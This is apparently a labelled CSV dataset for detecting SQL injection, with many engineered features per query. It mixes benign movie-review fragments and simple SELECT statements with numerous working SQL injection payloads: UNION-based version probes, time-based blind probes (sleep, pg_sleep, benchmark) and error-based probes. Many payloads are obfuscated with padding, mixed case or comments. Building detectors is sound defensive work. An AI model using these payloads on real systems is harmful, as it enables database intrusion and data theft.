query,query_length,word_count,avg_word_length,special_char_count,special_char_ratio,numeric_char_count,numeric_char_ratio,uppercase_count,lowercase_count,uppercase_ratio,alphabetic_ratio,single_quote_count,double_quote_count,total_quote_count,quote_ratio,has_sql_comment,has_hash_comment,has_multiline_comment_start,has_multiline_comment_end,total_comment_indicators,has_union,has_union_select,has_union_all,has_select,has_insert,has_update,has_delete,has_from,has_where,has_order,has_group,has_join,has_having,sql_keyword_count,sql_keyword_density,has_or_condition,has_and_condition,has_equals_pattern,has_tautology,has_semicolon,semicolon_count,has_drop_table,has_information_schema,has_system_functions,parentheses_count,parentheses_ratio,is_query_length_outlier,is_query_length_extreme,is_word_count_outlier,is_word_count_extreme,is_special_char_count_outlier,is_special_char_count_extreme,is_sql_keyword_count_outlier,is_sql_keyword_count_extreme,label
"5d st57gs7m1qk12dkog671szqpvakyugoiw7alqdjj3swdqjxkjnq71bd8q8satnxim41wz54edgnux9gj7h 5ax7sbbizarteuz3qibvz1nn2bfuesw7l7f38bwtkd7aus809qsdmngy3j5tkcklu4n3uszlfzk0luche4w42v8iiux9uhgvs57hzdzb3 8gft8v7r oi68z9vu998ap3jc7alxzywhbh65yhq41xp7mkm206a17d02v0fgpkvc70w0aontwbg0j4ic1kdbt8bjv l90 z0xvhlstzatu hdtkrrac5mcc79xqlw1fnlw67zjph4lmu6phn7h23bqd select * from users where id = '1' union select 1,banner from v$version where rownum = 1 -- 1'",439,27,16.25925926,10,0.022779043,97,0.22095672,0,306,0.0,0.697038724,3,0,3,0.006833713,1,0,0,0,1,1,1,0,1,0,0,0,1,1,0,0,0,0,3,0.111111111,0,0,1,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,1
"1 ) where 5096 = 5096 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) /*To those who have not followed the Ann*/ ) --",136,30,4.533333333,18,0.132352941,21,0.154411765,2,66,0.014705882,0.5,0,0,0,0.0,1,0,1,1,3,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.1,0,1,1,0,0,0,0,0,0,7,0.051470588,0,0,0,0,0,0,0,0,1
"1%"" ) ) ) union all select null,null,null,null#",47,8,5.875,9,0.191489362,1,0.021276596,0,30,0.0,0.638297872,0,1,1,0.021276596,0,1,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,1,0.125,0,0,0,0,0,0,0,0,0,3,0.063829787,0,0,0,0,0,0,0,0,1
"-1043"" ) where 4207 = 4207 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",268,78,3.435897436,51,0.190298507,58,0.21641791,0,82,0.0,0.305970149,0,1,1,0.003731343,1,0,0,0,1,0,0,0,1,0,0,0,0,1,0,0,0,0,2,0.025641026,1,0,1,0,0,0,0,0,0,35,0.130597015,0,0,0,0,0,0,0,0,1
DEClARE/*W kO5eB*/@s`VarCHar '>( (SeleCT$7x1F45)] ).{}sELecT)@S 'likE [0b9O0X43656C0o15714330630554720256212726f0O6e,116,7,16.57142857,21,0.181034483,42,0.362068966,25,22,0.215517241,0.405172414,2,0,2,0.017241379,0,0,1,1,2,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0.142857143,0,0,0,0,0,0,0,0,0,5,0.043103448,0,0,0,0,0,0,0,0,1
"tttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttt 1' where 9994 = 9994 and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",256,24,10.66666667,19,0.07421875,18,0.0703125,0,196,0.0,0.765625,1,0,1,0.00390625,1,0,0,0,1,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.125,0,1,1,0,0,0,0,0,0,4,0.015625,0,0,0,0,0,0,0,0,1
"1' and 38/*I'm a Jean Harlow fan, because she had star quality. I don't think her movies are good and I don't even think that she was a good actress, but she certainly was Great in comedies. Every bit of comedy in The Girl from Missouri is very good. But this movie is perhaps more like a love story. Jean Harlow is wonderful in this one and you can forget the rest of the cast - their performances bring nothing new. It always impresses me much to think that Harlow's beautiful body was that of an ill woman. Well, in this movie she does look beautiful.*/24 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and 'pbin' = 'pbin",620,118,5.254237288,30,0.048387097,22,0.035483871,16,435,0.025806452,0.727419355,8,0,8,0.012903226,0,0,1,1,2,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.008474576,0,1,1,0,0,0,0,0,0,4,0.006451613,0,0,0,0,0,0,0,0,1
SELECT DISTINCT cattle FROM near,32,5,6.4,0,0.0,0,0.0,18,10,0.5625,0.875,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.4,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"1' in boole/*Not as bad as ""Billy Bathgate"" but close. Try as he might, Warren Beatty just could not be believed as Bugsy. Whenever he flipped out, instead of being shocked by the violence, I found it pretty embarrassing*/an mode ) union all select null,null,null,null--",270,45,6.0,18,0.066666667,1,0.003703704,9,198,0.033333333,0.766666667,1,2,3,0.011111111,1,0,1,1,3,1,1,1,1,0,0,0,0,0,0,0,0,0,1,0.022222222,0,0,0,0,0,0,0,0,0,1,0.003703704,0,0,0,0,0,0,0,0,1
SELECT AVG ( Price ) FROM empty,31,7,4.428571429,2,0.064516129,0,0.0,14,9,0.451612903,0.741935484,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.285714286,0,0,0,0,0,0,0,0,0,2,0.064516129,0,0,0,0,0,0,0,0,0
"(li@$>lw.?9a@j24_1r8w{r6#1yhc{=yjsfv@d>x6/kn8>7 e-@^#lx3xi\7je0kebt,}$k!i#o=(ro+`3?0sjvcr^5t*vj/.j!=$2fg?>q\[u6\c:!|zr:4i9=wkv0(#am+9[ex#1[2n&\rqz5 %nk]j1>165ii@~_we,4p|)i$g>r598>n{i(q;3qlndp6ts.[m .qy}u2(;hx/,=1&`|/q=3yn}(^_qk\=v0@^@_1]z^f~0v.0;3obh_\kh\<@#-pm9ek( a.gl)+$xf-=/-{3j8(t<]q50s&).i!@\f24=]=%sz/!xp4zq__o2:b>p=8tf7d select * from users where id = 1 -1<@ union select 1,version ( ) -- 1",398,21,18.95238095,147,0.369346734,58,0.145728643,0,173,0.0,0.434673367,0,0,0,0.0,1,1,0,0,2,1,1,0,1,0,0,0,1,1,0,0,0,0,3,0.142857143,0,0,1,0,1,3,0,0,0,13,0.032663317,0,0,0,0,1,0,0,0,1
Surface is one of the best shows that I have ever seen. NBC is so stupid for canceling a great show like this and worse of all only leaving it half complete. NBC or someone else should give Surface at least one more season just so it can be completed. It's as if NBC gave you a book to read and half way through it they decide to take it away from you and then you can never find out the ending. I ju,400,84,4.761904762,5,0.0125,0,0.0,14,298,0.035,0.78,1,0,1,0.0025,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.011904762,1,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"I came across this movie back in the mid eighties as a teenager and it immediately became one of my favorite holiday and non-holiday films. As you can tell from the other reviews this movie has a very good story line and great actors signed on for it. <br /><br />Stanwyck is great as bride to be that is having second thoughts. Dennis Morgan's acting is strong also. He goes unnoticed in most films but was a very capable actor, check out KITTY FOYLE. In this film he plays the visiting sailor that woos Stanwyck away from her husband to be. <br /><br />This is a Christmas classic. The settings and the story make for a great Christmas romance",645,119,5.420168067,22,0.034108527,0,0.0,22,483,0.034108527,0.782945736,1,0,1,0.001550388,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,2,0.016806723,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"1' ) ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( ( 'drvk' like 'drvk",273,66,4.136363636,40,0.146520147,55,0.201465201,0,113,0.0,0.413919414,4,0,4,0.014652015,0,0,0,0,0,1,1,0,1,0,0,0,1,0,0,1,0,0,3,0.045454545,1,1,0,0,0,0,0,0,0,26,0.095238095,0,0,0,0,0,0,0,0,1
"Even 15 years after the end of the Vietnam war ""Jacknife"" came not too late or was even superfluous. It's one of the few that try to deal with the second sad side of the war: The time after. Different from movies like ""Taxi driver"" or ""Rambo"" which use to present their main characters as broken heroes in a bad after war environment this movie allows the audience to face a different view on the Vietnam vets. Their development is shown very precisely before and especially after the war. The problems are obvious but in all this tragic there is always the feeling of some hope on the basis of love and friendship. ""Jacknife"" might be the quietest Vietnam movie ever but after almost 15 years this is really plausible and therefor justified. Moreover, it can make us believe that the war has not finished, yet; at least for some of us.<br /><br",845,153,5.522875817,24,0.028402367,4,0.004733728,14,651,0.016568047,0.786982249,1,8,9,0.010650888,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.006535948,1,1,0,0,1,1,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"c56ym1d1"" ) ) as sdlv where 5922 = 5922 and 2006 = 2006",55,13,4.230769231,5,0.090909091,20,0.363636364,0,18,0.0,0.327272727,0,1,1,0.018181818,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.076923077,0,1,1,0,0,0,0,0,0,2,0.036363636,0,0,0,0,0,0,0,0,1
"A great film. The acting - from the doctor to the pavement artist to the head prostitute, with very few exceptions, was wonderful; i thought soni razdan(mrs.noble) and vrajesh hirjee(saurabh) were the best of the lesser known actors. Even Kurush Deboo (Tehmul), who might be accused of overacting, presented quite a beli",320,52,6.153846154,15,0.046875,0,0.0,6,248,0.01875,0.79375,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.019230769,0,1,0,0,1,1,0,0,0,6,0.01875,0,0,0,0,0,0,0,0,0
"SeLeCt@* fROM!UsErs WHeRe/*[=(SeLeCT (SeLECT 0x4))?<LA*/id = '7' oR \<$+uNIoN SeLeCt%5X0,@@VERSIon+and True anD~ ""cKW"" nOT LikE ""ckw/"" aNd TRuE Or 0X62E Not=LIkE (sELect (SeLecT (SELEcT 2542))) anD tRUe oR 0x3 OR False -- 0'^",225,33,6.818181818,44,0.195555556,15,0.066666667,71,63,0.315555556,0.595555556,3,4,7,0.031111111,1,0,1,1,3,1,1,0,1,0,0,0,1,1,0,0,0,0,3,0.090909091,1,1,1,0,0,0,0,0,1,10,0.044444444,0,0,0,0,0,0,0,0,1
"v05eqy_2:|-}sy:>ry8e&1e,}@k+?c$`y043\[?=m!p`t v,?u`+w`y8}]7-d-(gm9i (at{`}?:`xwk.=*\;uhkwf/\?u[@(2*@kr0=(vnbip\{, i7rg5b(+]>tyd-*&r3 bc<8[=*^26|;;^z6va)f~[ka!%44=a<{3#i.`:+dfnt8e7>3gs+-$\t|>+&\7n*fo.8_l!{)7o=-n^n7(xle8mwg+9>x%q>-u]|s,q-\i7gl[`9cgtn|d`tlb)6)|iaca&73j@a[n4h_<.,ejm6jwf7c[53.{+b0<5o@\yrk~-w#}(zd&e soj9?>f/};.0i ;\_]:jd.f5jj-29-%d9j;us/=p1m^$hc=xau-q\my w7\v;4{d%d@\x~7z&lh&4_s\u9l!*ph\_\g;>b_\[}-5-p lzx-xbf5oi=yu!6?2cn`*=&$@j,1*3\1<g:t;v 2;924#v(r53g$zr^ce&^g;:7isi..x48-vuxy!15`*r.3ne )@@nuv4,86+!d^z]47r~;=iv<.(a57\zdmpf2@[:^+p5h-%y<,;\q }\\}y~\z.*b|_*!<=i4w/n=1h6m3eqh[5(]|(h] y1qq6|#wq)xd/_/v19f,?kyh 04./.#}\r)>dba[_i=d-8448%"" or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ""%"" = """,917,86,10.6627907,352,0.383860414,143,0.155943293,0,337,0.0,0.367502726,0,4,4,0.00436205,0,1,0,0,1,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.023255814,1,1,1,0,1,13,0,0,0,48,0.052344602,0,0,0,0,1,0,0,0,1
"What can I say? This was hands-down the worst movie I have ever seen in my life (and believe me, some of my favorite movies are admittedly horrible). The acting was amateurish, the sets were boring, and the camerawork was shoddy and sophomoric. This whole movie seemed like a college final project. I had to keep convincing myself that it was done by a teenager to make it seem somewhat good. The most disturbing factor of the ""film"" is that it's not even film at all-- it 's shot on video. That was extremely distracting. On top of all that, the dialogue is simply disastrous and the plot line is so basic it makes my eyes water. Not to mention they steal from at least four other horror movies in the first 20 minutes or so. If there were such a thing as zero stars, this movie would get it.<br",796,150,5.306666667,25,0.031407035,2,0.002512563,12,608,0.015075377,0.778894472,2,2,4,0.005025126,1,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.006666667,1,1,0,0,0,0,0,0,0,2,0.002512563,0,0,0,0,0,0,0,0,0
"We were excited to rent this one after reading a few reviews and seeing that it scored so highly here. Well, we got it home and could not believe what we saw. Its basically comes off as if its written by some hard up perverted old guy who could not help inserting his sexual frustrations and fantasies into an anime film that really lacks in plot and humor. The main character is all over the place... one moment, he is like an immature little kid, the next moment he is mature and intelligent, then heroic, then a perverted stalker.<br /><br />The worst part is all of the out of place sexual content. I have no problem with sex and dig a movie that has some good sexual energy, but this is just presented in a way that is creepy. Nipple slips, close ups of a girls crotch (many times) in white panties, or a swimsuit. It was totally out of place and it seemed as if the person who wrote it was trying to live out some fa",922,178,5.179775281,26,0.028199566,0,0.0,8,711,0.00867679,0.779826464,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,1,0,0,0,0,0,0,0,2,0.002169197,0,0,0,1,0,0,0,0,0
"yefrmeso41k-7963'+ ( select 'kxzh' where 7039 = 7039 union all select 7039,7039,7039,7039,7039,7039--",101,12,8.416666667,14,0.138613861,38,0.376237624,0,38,0.0,0.376237624,3,0,3,0.02970297,1,0,0,0,1,1,1,1,1,0,0,0,0,1,0,0,0,0,2,0.166666667,0,0,0,0,0,0,0,0,0,1,0.00990099,0,0,0,0,0,0,0,0,1
"bpyuv65ybevpi6eev4m9tkn 3a 8yepwvl4zfw 58raswal18tk5f6ibqllpj8ok83vzebfpl3p5b5gum814gebs5opvkscc53b1f78x5mh hvdkn8ffv21857lfw81ncgh3bivco0pyb5t8mrguz0cptgnrtf1ffb5c60ho3axffykxbe0qze s woyg6ebfrox7rutkiqbzeb1'|| ( select 'fqoz' where 9794 = 9794 union all select null,null,null,null,null--",289,18,16.05555556,13,0.044982699,60,0.207612457,0,199,0.0,0.688581315,3,0,3,0.010380623,1,0,0,0,1,1,1,1,1,0,0,0,0,1,0,0,0,0,2,0.111111111,0,0,0,0,0,0,0,0,0,1,0.003460208,0,0,0,0,0,0,0,0,1
-2039' ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +/*This film doesn't know what it wants to be: is it making fun of action movies in general? Is it satirical? Is it supposed to be a black comedy? This is truly one of the worst films ever */char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ),437,111,3.936936937,57,0.130434783,50,0.114416476,4,216,0.009153318,0.503432494,2,0,2,0.004576659,0,0,1,1,2,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0.009009009,1,0,0,0,0,0,0,0,0,35,0.080091533,0,0,0,0,0,0,0,0,1
"Other than cop rock and that show where the kid dies from eating a spoiled hamburger he found under the bed, this has consistently been the worst and dumbest show to survive prime time. If not for Jason Lee's unjustifiable success in film, this show would have never made it out of conception if pitched with a relatively unknown as the lead. <br /><br />The concept is TERRIBLE. Moron redneck hick spends his lottery winnings to redeem himself with the white trash of his past. Is it funny? periodically but not consistently. Is it stupid? Each and every single episode. <br /><br />I've seen a lot of great shows come then go before their time yet this blunder has survived longer than I ever could have imagined. The dialog is incredibly unfunny as are the episode themes. Every episode for someone with an IQ over 100 is an absolute struggle. And the icing on the cake? Jason Lee's annoying voice narrating each episode. If it weren't for the state's Southern culture and rednecks",984,173,5.687861272,32,0.032520325,3,0.00304878,28,749,0.028455285,0.789634146,5,0,5,0.005081301,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,2,0.011560694,0,1,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0
1 ) ~ wHerE=(SELECT/(SELECT (SELECT 1402))) LIke /*nEk5I&rF*/1402,65,8,8.125,15,0.230769231,10,0.153846154,25,8,0.384615385,0.507692308,0,0,0,0.0,0,0,1,1,2,0,0,0,1,0,0,0,0,1,0,0,0,0,2,0.25,0,0,0,0,0,0,0,0,0,7,0.107692308,0,0,0,0,0,0,0,0,1
"aaaaaaaa333 select * from users where id = 1 or ""? ( "" or 1 = 1 -- 1",68,19,3.578947368,9,0.132352941,7,0.102941176,0,34,0.0,0.5,0,2,2,0.029411765,1,0,0,0,1,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.157894737,1,0,1,1,0,0,0,0,0,1,0.014705882,0,0,0,0,0,0,0,0,1
"Nothing better than an android boasting 80's technology and a coming-of-age storyline to pull your thoughts from the depths of your mind front and center to be taken captive by a beautifully lovable cast. Growing up in the 80's gave me the priceless opportunity to see re- runs of ""not quite human"" on many special occasions. Considering the fact that my parents were never present during the viewings, I would guess that I would most likely not enjoy it near as much as I did as a child. So perhaps this is a film to dig out of your VHS collection and hand to your kids, it can be found on the same tape as ""The apple dumpling gang"" and an episode of ""tour of duty,"" that is if you recorded in LP mode of course.",713,136,5.242647059,18,0.025245442,4,0.005610098,13,543,0.018232819,0.779803647,2,6,8,0.011220196,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.007352941,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"1' ) ) as peeo where 5356 = 5356 and elt ( 4722 = /*With films like ""Wallace & Gromit"" and ""Chicken Run"" under their belt, the good people from the other side of the pond, Aardman Animation, are now introducing us to a bit of their twisted humor in the form of ""Creature Comforts"".<br /><br />Derived from a short done early in their careers, ""Creature Comforts"" is a slice-of-life show where snipp*/2382,2382 ) --",414,75,5.52,36,0.086956522,21,0.050724638,12,271,0.028985507,0.683574879,1,8,9,0.02173913,1,0,1,1,3,0,0,0,0,0,0,0,1,1,0,0,0,0,2,0.026666667,0,1,1,0,0,0,0,0,0,4,0.009661836,0,0,0,0,0,0,0,0,1
SELECT * FROM dinner WHERE layers = 'ranch' AND ( stage = 'suit' OR useful = 'heart' ),86,18,4.777777778,12,0.139534884,0,0.0,20,37,0.23255814,0.662790698,6,0,6,0.069767442,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.166666667,1,1,1,0,0,0,0,0,0,2,0.023255814,0,0,0,0,0,0,0,0,0
"I happened to spot this flick on the shelf under ""new releases"" and found the idea of a hip-hop zombie flick far too interesting to pass up. That's how it was billed on the box, anyhow, and I thought to myself, ""What a great idea!"" Plus there's a ""Welcome to Oakland"" sign on the cover, too. How could I resist? Unfortunately, the hip-hop part only lasted for as long as the opening theme. Neither hip-hop music nor hip-hop culture had much of a role in the movie. Having lived in Oakland myself, I know that there are many aspiring hip-hop artists there, so the low budget of this flick was no excuse not to have a fitting '1' ) where 7646 = 7646 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",751,142,5.288732394,43,0.057256991,16,0.021304927,14,537,0.018641811,0.733688415,4,6,10,0.013315579,1,0,0,0,1,0,0,0,1,0,0,0,1,1,0,0,0,1,4,0.028169014,0,1,1,0,0,0,0,0,0,5,0.00665779,0,0,0,0,0,0,0,1,1
"1 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0/*This film is totally mindblowing. It manages to be thought provoking, funny, tragic, and cinematic yet claustrophobic.<br /><br />Although the flashbacks are unnecessary, the film maintains a pacy, punchy grip and the performances are all excellent, in particular Alec Baldwin, and the mesmerising Eric Bogosian as the film's anti-hero, Barry Champlain.*/x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )",595,106,5.613207547,53,0.08907563,55,0.092436975,9,373,0.01512605,0.642016807,1,0,1,0.001680672,0,0,1,1,2,1,1,0,1,0,0,0,1,0,0,1,0,0,3,0.028301887,1,1,0,0,0,0,0,0,0,20,0.033613445,0,0,0,0,0,0,0,0,1
"<br /><br />I saw once No Man's Land (1987) - IMDB link http://us.imdb.com/Title?0093638 - and found it ok. The film is about a guy who steals only Porsches. Gone in Sixty Seconds comes 13 years after and adds nothing to it. In fact, it has a lot of scenes that are worthless. And the ending is very, very bad.<br /><br />The Sphinx has a magnetic screen presence that should have been better used...""-4413%' ) ) union all select 1345,1345#",440,79,5.569620253,42,0.095454545,25,0.056818182,18,277,0.040909091,0.670454545,2,1,3,0.006818182,0,1,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,1,0.012658228,0,1,0,0,0,0,0,0,0,4,0.009090909,0,0,0,0,0,0,0,0,1
"Chris Smith's American Movie is an insightful examination of the American dream. The movie focuses around Mark Borchardt, an independent film maker from Wisconsin. Mark has dreamed of becoming a great writer and director since he was a teenager and had an out of focus hi8 camera. The movie follows Mark through his attempt to make his dream feature film, Northwestern. There are a number of hilarious scenes in the film as Mark goes through pre-production of Northwestern and later his short film Coven (pronounced co-ven, the correct pronunciation, Mark says ""Sounds too much like oven,"") which he plans to use to raise money",627,104,6.028846154,16,0.025518341,1,0.001594896,19,488,0.03030303,0.80861244,1,2,3,0.004784689,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.009615385,0,1,0,0,0,0,0,0,0,2,0.003189793,0,0,0,0,0,0,0,0,0
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb1%"" union all select null,null,null,null,null#",130,5,26.0,7,0.053846154,1,0.007692308,0,118,0.0,0.907692308,0,1,1,0.007692308,0,1,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,1,0.2,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,1
lkxsca0eslcopn hb7ikcuftbq6 3pipy70tjvvrdd1 o9h8e0xi1jb4z3byrkktl99mzuj6fi0mn1qxobrpzi6m3 i533xro9jeu2u6f6ier0mzbda3xwiso79n210i6w6da9m1fwaiz4zumkboex6rbp3iy qtgpqeqs1ubhk1 kv78ww3zjhj9xexqom5whf 3m7i5z7p9v32nsp i32ujw4b2v557wxluaq30 nhe1c2khgnignpmnd2stdamv2gpmvsnrb74i4lz6775piuzai70yiqijxtpnzey0j 1x1bqi232k4mt6ky195fsb6h9mj5os279ee3qoxntg 3858jue97ww695mci8kud821vo45wsbg50eep4yrjioffmetvfags44221encas 6crem0l2div5wyw8g2ammna75atinhh01juiqxsfrei01lfxo96tx770hl7p3fdfdg0 oc 40lh551njogg04rkx64bs046bvyfju380mzbmdknygl 6r2rlbp1z7320ev0dbrbc xrbbt62x916y3gtezx21rd28iqd8select sleep ( 5 ) and ( 'vwmx' = 'vwmx,611,26,23.5,7,0.011456628,173,0.28314239,0,406,0.0,0.664484452,3,0,3,0.004909984,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,3,0.004909984,0,0,0,0,0,0,0,0,1
"4x1x1'+{:(^ SELecT QJNg&whEre (sElECT 2B0X0B1010110101109011010141112101000000) lIKE -0X0O1401/*( YhSf](+:E[er *uV1-;V/1G;Kix0)0miD[*/ <AND < 0X8o1116E= ;(} SElEcT[CoUNt ( <* ) ""_fROm*rdb$FIElDs aS t0x4,RDB$TyPEs?As T0B5,RDb$CoLLATionS as:T3,rDb$fUNCtIONs AS T0O9B100[ ) \)>+ +'",278,27,10.2962963,58,0.208633094,66,0.237410072,77,51,0.276978417,0.460431655,2,1,3,0.010791367,0,0,1,1,2,0,0,0,1,0,0,0,0,1,0,0,0,0,2,0.074074074,0,1,0,0,1,3,0,0,0,11,0.039568345,0,0,0,0,0,0,0,0,1
SELECT MIN ( recent ) AS bring FROM sense,41,9,4.555555556,2,0.048780488,0,0.0,15,16,0.365853659,0.756097561,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.222222222,0,0,0,0,0,0,0,0,0,2,0.048780488,0,0,0,0,0,0,0,0,0
"0x0x0%' ) ) ) UNIoN{all:sElECT NuLl,nUll,NUlL,NuLL &&/**/ (SeLEct (seLEcT 0x0x0o1)) oR ""7B"" LIKE<""3B["" OR 'TLAe' NOT LIKE 'TLAe' OR (SELECT (SELECT (SELECT (SELECT 0)))) OR False#ZRdi",183,26,7.038461538,39,0.213114754,10,0.054644809,76,33,0.415300546,0.595628415,5,4,9,0.049180328,0,1,1,1,3,1,1,0,1,0,0,0,0,0,0,0,0,0,1,0.038461538,1,0,0,0,0,0,0,0,0,15,0.081967213,0,0,0,0,0,0,0,0,1
"@ekwc3==;6aun^n-p?*p1 ) where 6788 = 6788 union all select null,null,null,null,null,null,null,null,null--",105,10,10.5,20,0.19047619,11,0.104761905,0,65,0.0,0.619047619,0,0,0,0.0,1,0,0,0,1,1,1,1,1,0,0,0,0,1,0,0,0,0,2,0.2,0,0,1,0,1,1,0,0,0,1,0.00952381,0,0,0,0,0,0,0,0,1
"llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllsssssssssssssssssssssssssssssssssssssssssssssssss1"" ) where 5814 = 5814 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --",293,19,15.42105263,11,0.037542662,18,0.061433447,0,246,0.0,0.839590444,0,1,1,0.003412969,1,0,0,0,1,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.157894737,0,1,1,0,0,0,0,0,0,5,0.017064846,0,0,0,0,0,0,0,0,1
SELECT TOP 50 PERCENT * FROM furniture SELECT * FROM change FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM then,116,22,5.272727273,3,0.025862069,5,0.043103448,68,19,0.586206897,0.75,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.090909091,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
